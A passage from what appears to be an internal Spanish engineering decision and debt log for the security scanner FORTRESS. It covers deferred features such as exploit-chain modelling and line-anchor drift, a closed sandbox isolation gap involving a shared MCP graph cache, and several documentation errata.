- **El único proyecto plantado es `ensayo-fail-closed`**, el rig desechable del
  operador: 14 vivas, 7 CRITICAL, un escaneo (2026-09-21), 0 propuestas, 0
  descartes. Su README dice «los defectos de `src/servidor.js` son a propósito»,
  el escáner **lo lee** (sin `SECURITY.md` cae a los docs generales, README
  incluido) y reporta igual: el contrato no tiene dónde ponerlo.
- **`false_positive` ya saca de todo lo que importa**: del quality audit
  (`isOpen`), del bloqueo del push por CRITICAL, de la cola del Motor (`vivo`) y
  del Terminal (`seResuelveEnTerminal`). **Descartes en toda la historia: 4**,
  todos de FORTRESS del 5 y 6 de septiembre, sin repetición.
- **Mecanismo por ruta: ninguno.** `.fortress/config` entiende `autoMerge`
  (obligatorio) y `scope.groups`; el escáner lista con `git ls-files` y pide en
  el checklist «ignora node_modules, dist, build, .git y terceros», frontera
  blanda. No excluye tests, fixtures ni docs.

**Las dos opciones, medidas y aparcadas:** un estado nuevo «intencional» (8 a 10
ficheros: vocabulario, descartes con motivo, derivación de la fila, tabla
exhaustiva del tablero, toggle de la UI) o la **exclusión por ruta** en
`.fortress/config` (unos 6 ficheros: bloque nuevo, línea del checklist y filtro
duro al asentar, porque la frontera del prompt es blanda). Ninguna tiene
consumidor hoy. **Si algún día un cliente trae fixtures deliberadamente
vulnerables, la exclusión por ruta es la pieza barata.** Hasta entonces, no se
construye. `ensayo-fail-closed` se puede borrar de la app cuando el ensayo
termine: limpia 14 filas.

**La deuda real, separada, está en la tabla de §6**: el score del escaneo cuenta
los descartados. `calcularExpediente` (`expediente-del-cierre.ts:29-31`) puntúa
`datos.reportados`, que son hallazgos detectados **sin `status`**, más los ACTIVE
que este escaneo no nombró (`ausencia.ts:24`, que filtra `lifecycle` y no
`status`). El quality audit filtra con `isOpen` (`run-quality-audit.ts:24`) y el
push con `status === 'open'` (`record-push-decision.ts:28`). Un descartado que el
escáner vuelve a nombrar **cuenta en el score del cierre y no en el audit**. No
es de defecto a propósito: es un bug de consistencia del score, con su fila.

### 6.4 Cadenas de explotación: medido, anotado, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `d69fac7`,
base viva en solo lectura): **no se construye**. Es la pieza más cara del
contrato y la de menos señal.

**Lo medido:**

- **Las «3 observaciones» del backlog eran coincidencias de la palabra
  «cadena»**: cadenas de texto, de llamadas, de hashes. Sobre cadenas de
  explotación hay **una**: Trade99PRO, 2026-09-12, área `contrato-del-hallazgo`,
  pendiente: «el contrato no permite expresar cadenas de explotación
  (portfolio-cron entrega UUIDs que alimentan agent-loop)». Sus 3 avistamientos
  son 3 quejas distintas fundidas; la señal real es 1.
- **Instancias en la base: una.** `portfolio-cron/index.ts:40` («sin
  autenticación devuelve el UUID de todos los usuarios») y
  `agent-loop/index.ts:28` («ejecuta ciclos de trading para cualquier userId sin
  verificar»). **Los dos eslabones ya son CRITICAL**, Trade99PRO tiene 13
  CRITICAL y score 0: la cadena no cambiaría el score, el push ni el orden.
  De 497 títulos vivos, 23 dicen «permite» y describen un solo defecto; de 171
  análisis, 36 dicen «cadena» y son cadenas de llamadas o de texto.
- **Nada de lo que existe expresa «estos suman»**: hermanos (misma sede o
  misma clase), `mismoDefectoQue` (fusión más alias) y la fusión por identidad
  dicen «el mismo defecto». El contrato empuja a partir: fichero y línea
  concretos, símbolos distintos, «partirlo es del escáner».
- **Consumidor: ninguno.** El score suma y pone techo en 64 con cualquier
  CRITICAL; la UI agrupa por estado y severidad; el Motor repara un hallazgo
  con un fix (ADR-012) y solo corre sobre FORTRESS; el Terminal resuelve un foco.
- **Coste: el más alto del contrato.** Una tabla de relaciones (rechazada en
  ADR-101 §6 porque se pudre cuando una fila muere o cambia de clave), un juicio
  «estos encadenan» con candidatos fuera de la sede (todas las vivas del
  proyecto, hasta 156 en el prompt), persistencia, y tres consumidores nuevos:
  score de cadena, agrupación en la UI, elección del eslabón en el Motor. Más
  caro que el corte 2 y con menos señal: 1 instancia frente a 90 pares.

**Condición de reactivación:** que aparezcan cadenas cuyos eslabones **no** sean
ya CRITICAL por sí solos (tres LOW que juntos son críticos). Entonces el score
tendría consumidor. Hasta entonces, no.

**Aparte, con su origen:** la misma observación pide un **hallazgo de patrón
repetido en N ficheros**. Es otra pieza sin modelar y va en la tabla de §6.

### 6.5 Patrón A, la línea que ya no es: medido, anotado con condición, no construido (2026-09-23)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-23** (main `c971730`,
base viva en solo lectura y repos en disco): **no se construye**. Es la última
pieza del arco #3, y con ella el arco queda cerrado.

**Lo medido:**

- **Las 12 observaciones** (23-ago a 4-sep) son todas de FORTRESS y del analista
  del Motor: el ancla caía en una llave de cierre, un `return new Promise`, un
  import o un comentario porque el fichero creció por encima. Todas dicen que
  el desfase **no invalidó el análisis**: el analista releyó el fichero.
- **Ancla hoy en disco, 492 vivas**: 441 en código, 26 en comentario, 2 vacías,
  1 import, 3 sin línea, 19 de Trade99PRO sin fichero en disco. Ficheros
  cambiados tras `first_seen`: 19, **todos de FORTRESS**. Los repos de clientes
  son instantáneas estáticas: 0 cambios, deriva imposible ahí. En FORTRESS, **6
  de 40 vivas (15 %)** tienen el ancla en un comentario de un fichero que
  cambió: `scope-groups.ts:24`, `git-merge-applier.ts:13`, `repair-git.ts:11`,
  `spawn-entorno-acotado.test.ts:12`, `write-cognition-log.ts:21`,
  `unmap-ipv4.ts:12`. Los 20 comentarios de clientes son anclas legítimas
  (documentación que contradice código, CSS), no deriva.
- **Duplicados por línea movida: 0** hoy; el lote del alias los acaba de juzgar.
- **La mecánica**: identidad `fichero|línea|tipo`; el sync casa clave exacta o
  alias y `TOUCH` no mueve la línea; en un fichero cambiado el modelo re-emite en
  la línea nueva, nace fila nueva y la vieja sigue ACTIVE hasta un juicio (lote
  manual, o el analista del Motor, solo FORTRESS). La **palanca 1 de ADR-101 ya
  cubre el fichero quieto** (deriva 0 medida); **falta medir el fichero
  cambiado**: la palanca 1 entró el 23 y el último escaneo de FORTRESS es del
  18, así que la memoria no ha corrido aún sobre un FORTRESS crecido.
- **Daño**: solo tiempo del analista al relocalizar; **0 reparaciones en línea
  equivocada** (el analista relee, ADR-102 declara el arreglo, la correa es por
  fichero); la extinción busca el marcador en el fichero entero, no en la
  línea; **el operador no va a la línea**: la UI no abre ficheros.
- **Reanclar por símbolo, rechazado con dato**: de los 5 grupos vivos con mismo
  fichero, tipo y símbolo en líneas distintas, el lote juzgó DISTINTOS al menos
  uno (`rate-limit.ts` 28 y 20 son dos defectos), y 7 de los 96 pares del lote
  eran mismo tipo y defectos distintos. Una regla automática se equivoca 1 de 5.
  «Última definición gana» es el problema de las migraciones append-only de
  nucleo, otra pieza.

**Condición de reactivación:** medir la deriva de línea en el próximo escaneo
de FORTRESS con `medir:deriva`, que ya existe. Si la palanca 1 no la mata y
aparecen duplicados por línea, la pieza barata es **correr el lote del alias
automáticamente tras cada escaneo**: un juicio, no una regla. Hasta entonces, no.

---

### 6.6 Cognition al COGNITION-LOG: medido, anotado con condición de reactivación, no construido (2026-09-26)

**Decisión de Jojo y el CTO sobre la medición del 2026-09-26** (main `22a5fdd`,
base viva en solo lectura): **no se construye** (camino C). Es la sub-pieza 5 del
arco #5 del ROADMAP.

**Lo medido:**

- **«Cognition escribe el log» contradice ADR-047** (2026-08-05, Aceptada): «el
  MOTOR, no el LLM, reescribe de forma determinista el COGNITION-LOG». Que solo
  el cierre del escaneo escriba el fichero (`cerrar-escaneo.ts` →
  `escribir-memoria.ts` → `rebuildLog`) es a propósito, no un hueco.
- **Cero uso desde agosto.** 3 corridas del agente en toda la base: 2 útiles el
  2026-08-04 (31 y 21 turnos, unos 2,60 $, 0 ediciones) y 1 fallida el 08-12.
  Ninguna después.
- **Lo que produciría, nadie lo lee.** El agente devuelve prosa (patrones,
  defensas) al historial del chat o al texto final del workflow, que cierra
  siempre con él (`CLOSING_STEP`). El consumidor real del log, el analista
  (`graph-analyst.ts:58` → `patron-del-hallazgo.ts`), usa del patrón emparejado
  solo id, estado, recurrencias y fecha; las reflexiones las pinta el panel y
  nada más las consume. AGENTS.md promete «patrones con causa raíz y prevención
  hacia el COGNITION-LOG»: no ocurre.
- **La reflexión del motor ya cubre lo que se lee:** una línea por corrida con
  conteos y score, más los patrones regenerados del expediente.

**Condición de reactivación.** Si Cognition vuelve a usarse (corridas nuevas) y
sus reflexiones ganan un consumidor, la pieza es el cuello de notas que ya usa
OMEGA (`peticion-de-notas.ts` → `asentarNotas`): Cognition escribe
**observaciones al sistema nervioso, no el log**, respetando ADR-047 sin
enmendarlo.

### 6.7 Los denials del ejecutor de Construir: dato duro sin asentar (2026-09-26)

**Medido al construir la sub-pieza 3 del #5** (main `2266922`): el ejecutor de
Construir corre en `acceptEdits`, la mayor superficie de denegaciones, y su
respuesta trae `denials` (dato duro del CLI, como los del chat que `finishTurn`
asienta con `observacionesDeDenials`). Hoy el ejecutor asienta sus **notas**
(prosa que pide el prompt) pero **no sus denials**: la deuda vivía solo en el
docblock de `quien-no-observa.test.ts` (`ejecutor-observa-de-denials`) y no
aquí. Son fuentes distintas: la nota es lo que el agente dice; el denial es lo
que FORTRESS le negó.

**Arreglo cuando se decida:** una línea en `build-feature.ts`, tras la corrida,
`asentarNotas(context, project, observacionesDeDenials(reply.denials, 'autonomo'))`,
con su test y su mutante. Sin consumidor medido hoy (0 corridas del ejecutor
con denials en la base viva), por eso se anota y no se construye.

## 7. Dónde viven las deudas de FORTRESS sobre su propio código

**No se duplican aquí.** La fuente de verdad es la **Historia de hallazgos del
proyecto `fortress-command-center`** dentro de la propia app: es la herramienta
midiéndose a sí misma, con evidencia y ciclo de vida.

Del escaneo del 2026-09-18 (23 hallazgos): los **6 HIGH** están todos en
`templates/` —el kit que FORTRESS distribuye, no su maquinaria—, y en `src/`
salieron **2 MEDIUM** (`build-env.ts:38`, `project-mcp.ts`) y **8 LOW** de
accesibilidad.

**Lo que este documento recoge es lo que el escáner NO puede ver**: decisiones
pendientes, contratos a medias y defectos de comportamiento que solo aparecen
corriendo el producto.

---

## 8. Cazado al poner la documentación al día (2026-09-24), por prioridad

Siete hallazgos al recorrer el código de `main@052638b` para actualizar
FUNCIONAMIENTO-ACTUAL, GLOSSARY y este documento. Autorizados por Jojo el
2026-09-24, con la lectura del CTO: **el primero no es una errata de
documentación, es un agujero del aislamiento con ADR ya aceptado.** Ninguno se
inventó: cada uno lleva lo que se midió y dónde.

### 8.1 ~~ALTO — Gap de seguridad: la clase A corre con el HOME real, y su grafo ve a todos los clientes~~ — **CERRADO** `fd4b5c2` (2026-09-25)

**Qué es.** El sandbox de ADR-092 encerró la clase B en `bwrap` con el HOME
tapado por un tmpfs (`src/domain/sandbox/flags-de-bwrap.ts:63`). La clase A
—el turno del CLI, `claude -p`— no: el proceso se lanza con
`env: buildEnv(...)`, que copia `process.env` entero, HOME incluido
(`src/infrastructure/claude-code/claude-code-agent.ts:54`,
`src/infrastructure/claude-code/build-env.ts:38`). El `--settings` del sandbox
del CLI niega la lectura del HOME **a los comandos que el agente ejecuta**
(`src/domain/sandbox/config-del-cli.ts:14,44`), pero el propio CLI y sus
servidores MCP corren fuera de esa correa: el `codebase-memory-mcp` del turno
resuelve su caché en `$HOME/.cache/codebase-memory-mcp`
(`src/infrastructure/graph/read-graph-index.ts:8`) y ve los `.db` de **todos**
los clientes. Y no solo ve: el 0.9.0 pone un vigilante sobre su cwd al arrancar
y reindexa el proyecto del turno cuando cambia (reproducido aislado el
2026-09-24 con HOME propio: `watcher.changed → watcher.reindex` con el servidor
vivo unos segundos tras un cambio), sin que `graph_indexed_at_sha` se entere: el
escenario de «turno vivo» que `decideReindex` evita, hecho por el servidor por su
cuenta.

**Evidencia.** 134 carpetas de logs MCP bajo
`~/.cache/claude-cli-nodejs/*repair-worktrees-*/mcp-logs-codebase-memory/`:
turnos del motor conectando el grafo desde worktrees, con el HOME real. La
garantía de producto «el código de un cliente no ve al de otro» tiene esta
excepción en clase A. **No medido en un turno real** (que un agente consulte de
hecho el `.db` de otro cliente, o que el vigilante reescriba a mitad de un
checkpoint transitorio): la mecánica está probada, el daño en vivo no.

**Qué lo cierra.** ADR-095 pieza B, «LA PARED: un `HOME` por turno con un solo
grafo dentro»
(`docs/DECISIONS/adr-095-el-grafo-solo-responde-del-proyecto-del-turno-y-los-guardianes-dejan-de-mentir.md:148`),
**aceptada el 2026-09-18 y sin construir**. Es una pieza pendiente del
aislamiento, para retomar con el sandbox o con el arco #5; no una nota.

**Cerrado el 2026-09-25** (merge `fd4b5c2`, 9 commits, gate 6/6 sobre `main`,
9 mutantes muertos). La medición encontró una palanca mejor que la del ADR: la
0.9.0 honra `CBM_CACHE_DIR` (y no `XDG_CACHE_HOME`), así que la **enmienda a
ADR-095 pieza B, firmada por Jojo**, sustituye el `HOME` por turno por un
**directorio por turno con una copia real del `.db` del proyecto**, puesto en el
`env` de la entrada del servidor: el `HOME` del CLI no se toca y no hay
`~/.claude` que enlazar. La palanca entra en los **dos caminos** —`withGraph`
(Terminal, escáner, génesis, episodios, borradores, build) y el `GRAPH` propio
del motor (generador, analista, crítico, OMEGA)—; `index-graph`, `verify-graph`,
el runner de reindex y `readGraphIndex` siguen en la caché real. El servidor
sobre la copia **rechaza** con error legible lo que no está (`project not found
or not indexed`, `available_projects` con solo la copia; fijado con test sobre
el binario real) y el grafo aislado gana al que traiga el `.mcp.json` del
proyecto: el muro no es opcional. Prueba dura, dos veces: un turno real de
clase A sobre ensayo-fail-closed vio 62 nodos desde la copia, recibió el error
literal al pedir FORTRESS, y dejó la huella de los ocho `.db` de la caché real
**idéntica**. Las cuatro piezas de la pared están en los innegociables
(`DEFENSAS_DEL_GRAFO_POR_TURNO`). El binario instalado no lo lleva hasta el
rebuild.

### 8.2 ALTO — Errata: SECURITY-MODEL.md no conoce el sandbox

`docs/SECURITY-MODEL.md` tiene **cero** menciones de caja, `bwrap`, sandbox o
ADR-092 (medido con grep el 2026-09-24); su «Alcance» (línea 12) y su «Lo que NO
cubre este modelo» (línea 231) están escritos como antes del arco #1. Un lector
del modelo de seguridad no vería la contención que existe desde `cd6a510`.
**Debe actualizarse con el sandbox, no solo anotarse**: gesto pendiente, del
mismo corte que los tres documentos del 2026-09-24.

### 8.3 MEDIA — Errata: TAXONOMIA-DE-DEFECTOS.md sin las seis familias de auditoría

`docs/TAXONOMIA-DE-DEFECTOS.md` se presenta como «el vocabulario cerrado de
tipos» (línea 3) y el glosario la señala como la lista completa
(`docs/GLOSSARY.md:434`), pero no contiene `accesibilidad`, `privacidad`,
`integridad-de-negocio`, `continuidad-y-backups`, `dependencia-vulnerable` ni
`criptografia-debil` (cero menciones), que ADR-100 sumó al vocabulario
(`src/domain/scan/defectos-de-auditoria.ts:19-31`).

### 8.4 MEDIA — Errata: DATA-MODEL.md sin `finding_aliases`, y `has_graph` con el significado viejo

`docs/DATA-MODEL.md` no menciona la tabla `finding_aliases` (cero menciones),
creada en `src/infrastructure/persistence/schema-aliases.ts:16` (ADR-101), y
describe `has_graph` solo como columna con default 0 (línea 115): desde
`686b212` significa «hay índice en disco» y la alinea el reconcilio (§5.6).

### 8.5 BAJO — Gap: el pre-vuelo lee solo `.claude/settings.json`

`leerSettingsDelProyecto` lee únicamente
`join(projectPath, '.claude', 'settings.json')`
(`src/infrastructure/project/barreras-del-proyecto.ts:46`). Un hook `PreToolUse`
declarado en `.claude/settings.local.json` es invisible para el pre-vuelo y para
el bloque de barreras declaradas (ADR-104). Medido: hoy ningún proyecto
registrado tiene hooks en `settings.local.json` (este repo solo tiene ese fichero,
sin hooks; el settings global del operador tampoco los tiene). Real, bajo.

### 8.6 BAJO — Gap de diseño: «Loop blindado» arranca un agente real en cada integración

`scripts/checks/loop-guard-checks.cjs:42-49` registra el repo propio
(`projects.self()`) y lo enciende con `setLoopEnabled(true)`, que es `startLoop`
→ `runEngine` (`src/infrastructure/loop/loop-controller.ts:44-53`): un ciclo real
con un `claude -p` sobre el repo. Con `f836f14` ya no fuga —el juez nace y muere
al nacer, y en el gate sobre `main` no abrió ninguna conexión MCP (275 → 275)—,
pero el diseño del test sigue lanzando un agente real por corrida. Cuestionable,
no fuga.

### 8.7 BAJO — Errata con matiz: ARCHITECTURE.md y OVERVIEW.md sin la caja ni el pre-vuelo

Cero menciones de sandbox, `bwrap`, caja, pre-vuelo o barreras en
`docs/ARCHITECTURE.md` y `docs/OVERVIEW.md` (medido con grep). Son documentos de
vista general y **quizás no deban** entrar en ese detalle: queda como pregunta,
no como obligación. **Decisión pendiente de Jojo.**
